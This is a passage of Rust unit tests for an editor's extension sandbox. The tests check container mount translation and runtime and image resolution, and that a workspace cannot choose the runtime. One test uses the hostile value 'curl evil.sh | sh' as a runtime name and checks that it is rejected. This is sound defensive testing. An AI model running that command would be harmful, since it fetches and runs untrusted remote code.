        // and an unknown option `b`. There is no quoting the option parser
        // honours, so the only safe answer is no.
        let mut config = config();
        config.readable_roots = vec![absolute("opt/deco,host")];
        assert_eq!(
            containerise(&config, &container(), "acme.ext"),
            Err(SandboxError::Unmountable {
                path: absolute_str("opt/deco,host"),
                why: "a comma would be read as the end of the mount source",
            })
        );
    }

    #[test]
    fn a_bootstrap_outside_every_mount_is_refused_before_the_container_starts() {
        let mut config = config();
        config.bootstrap = absolute("somewhere/else/bootstrap.js");
        assert_eq!(
            containerise(&config, &container(), "acme.ext"),
            Err(SandboxError::BootstrapNotMounted {
                bootstrap: absolute_str("somewhere/else/bootstrap.js")
            })
        );
    }

    #[test]
    fn paths_translate_into_the_container_and_back_out_of_range() {
        let mounts = Mounts::new(&config().readable_roots).expect("mounts");
        assert_eq!(
            mounts.inside(&absolute("opt/deco/host/src/bootstrap.js")),
            Some("/deco/mnt/0/src/bootstrap.js".to_owned())
        );
        assert_eq!(
            mounts.inside(&absolute("home/u/.deco/extensions/acme.ext")),
            Some("/deco/mnt/1".to_owned())
        );
        assert_eq!(
            mounts.inside(&absolute("home/u/.deco/extensions/acme.ext/out/main.js")),
            Some("/deco/mnt/1/out/main.js".to_owned())
        );
        // Not mounted, so there is no container path for it — including the
        // sibling extension next door.
        assert_eq!(mounts.inside(&absolute("home/u/project/src/lib.rs")), None);
        assert_eq!(
            mounts.inside(&absolute("home/u/.deco/extensions/other.ext")),
            None
        );
        assert_eq!(mounts.inside(&absolute("etc/passwd")), None);
    }

    #[test]
    fn a_named_runtime_has_to_be_one_deco_will_start() {
        let settings = settings(Scope::User, RUNTIME_KEY, json!("curl evil.sh | sh"));
        assert_eq!(
            ContainerConfig::resolve(&settings, None),
            Err(SandboxError::UnknownRuntime {
                name: "curl evil.sh | sh".to_owned()
            })
        );
    }

    #[test]
    fn a_missing_runtime_names_the_way_out_rather_than_taking_it() {
        // The instruction this implements: no runtime means no extensions, not
        // extensions with one layer fewer. The message has to name the setting,
        // because refusing without saying how to proceed is its own failure.
        let error = ContainerConfig::resolve(&Settings::empty(), None)
            .expect_err("nothing should be found on an empty PATH");
        let said = error.to_string();
        assert!(said.contains("podman"), "{said}");
        assert!(said.contains("docker"), "{said}");
        assert!(said.contains(SANDBOX_KEY), "{said}");
        assert!(said.contains("process"), "{said}");
    }

    #[test]
    fn an_absolute_runtime_is_taken_as_given() {
        let settings = settings(
            Scope::User,
            RUNTIME_KEY,
            json!(absolute_str("opt/bin/podman")),
        );
        let resolved = ContainerConfig::resolve(&settings, None).expect("an absolute path");
        assert_eq!(resolved.runtime, absolute("opt/bin/podman"));
        assert_eq!(resolved.image, DEFAULT_IMAGE);
    }

    #[test]
    fn a_workspace_cannot_choose_the_image_or_the_runtime() {
        let mut settings = Settings::empty();
        let mut layer = serde_json::Map::new();
        layer.insert(
            RUNTIME_KEY.to_owned(),
            json!(absolute_str("tmp/evil-runtime")),
        );
        layer.insert(IMAGE_KEY.to_owned(), json!(DEFAULT_IMAGE));
        settings.set_layer(Scope::Workspace, layer);
        // Nothing found, because the workspace's runtime was never considered.
        assert!(matches!(
            ContainerConfig::resolve(&settings, None),
            Err(SandboxError::NoRuntime { .. })
        ));
    }

    #[test]
    fn an_unpinned_image_from_the_user_is_still_refused() {
        // Trusted enough to be read is not the same as trusted enough to skip
        // the rule: a digest is the only reason to believe an image is what it
        // was when it was reviewed.
        let mut settings = settings(
            Scope::User,
            RUNTIME_KEY,
            json!(absolute_str("usr/bin/podman")),
        );
        settings.set(Scope::User, IMAGE_KEY, json!("node:22"));
        assert_eq!(
            ContainerConfig::resolve(&settings, None),
            Err(SandboxError::UnpinnedImage {
                image: "node:22".to_owned()
            })
        );
    }

    #[test]
    fn preparing_a_host_without_a_runtime_fails_instead_of_running_it_bare() {
        // The instruction, as a test: no container runtime is a refusal, not a
        // downgrade. Nothing about `prepare` may produce a bare process unless
        // the policy asked for one.
        let error = prepare(&Settings::with_defaults(), &config(), "acme.ext", None)
            .expect_err("no runtime, so no host");
        assert!(matches!(error, SandboxError::NoRuntime { .. }));
    }

    #[test]
    fn asking_for_the_process_gets_the_process_and_says_so() {
        let settings = settings(Scope::User, SANDBOX_KEY, json!("process"));
        let made = prepare(&settings, &config(), "acme.ext", None).expect("no runtime needed");
        assert_eq!(made.sandbox, Sandbox::Process);
        assert_eq!(made.mounts, None);
        // The host's own command line, unwrapped: the program is Node itself.
        assert_eq!(made.spec.program, absolute("usr/bin/node"));
        assert!(made.spec.args.iter().any(|arg| arg == "--permission"));
        // And paths are this machine's, because that is what the host will open.
        assert_eq!(
            made.seen_by_host(&absolute("opt/deco/host/src/bootstrap.js")),
            Some(absolute_str("opt/deco/host/src/bootstrap.js"))
        );
    }

    #[test]
    fn a_prepared_container_translates_the_paths_that_go_over_the_wire() {
        let mut settings = settings(
            Scope::User,
            RUNTIME_KEY,
            json!(absolute_str("usr/bin/podman")),
        );
        // Something a repository might have tried, to check it is carried out
        // rather than dropped on the floor.
        let mut workspace = serde_json::Map::new();
        workspace.insert(SANDBOX_KEY.to_owned(), json!("process"));
        settings.set_layer(Scope::Workspace, workspace);

        let made = prepare(&settings, &config(), "acme.ext", None).expect("an absolute runtime");
        assert_eq!(made.sandbox, Sandbox::Container);
        assert_eq!(made.ignored, vec![Scope::Workspace]);
        assert_eq!(made.spec.program, absolute("usr/bin/podman"));
        assert_eq!(
            made.seen_by_host(&absolute("home/u/.deco/extensions/acme.ext")),
            Some("/deco/mnt/1".to_owned())
        );
        // Not mounted, so there is no answer — better than a path that would
        // fail to open inside the container for reasons nobody could see.
        assert_eq!(made.seen_by_host(&absolute("home/u/project/a.rs")), None);
    }

    #[test]
    fn finding_a_runtime_prefers_podman_and_returns_an_absolute_path() {
        let dir = std::env::temp_dir().join(format!("deco-runtimes-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a directory");
        let name = |n: &str| {
            if cfg!(windows) {
                format!("{n}.exe")
            } else {
                n.to_owned()
            }
        };
        std::fs::write(dir.join(name("docker")), "").expect("a file");
        let path = std::ffi::OsString::from(dir.display().to_string());

        // Only docker present: docker it is.
        let found = find_runtime(&RUNTIMES, Some(&path)).expect("docker");
        assert_eq!(found, dir.join(name("docker")));
        assert!(found.is_absolute());

        // Both present: podman, because rootless is the better default.
        std::fs::write(dir.join(name("podman")), "").expect("a file");
        assert_eq!(
            find_runtime(&RUNTIMES, Some(&path)),
            Some(dir.join(name("podman")))
        );

        assert_eq!(find_runtime(&RUNTIMES, None), None);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
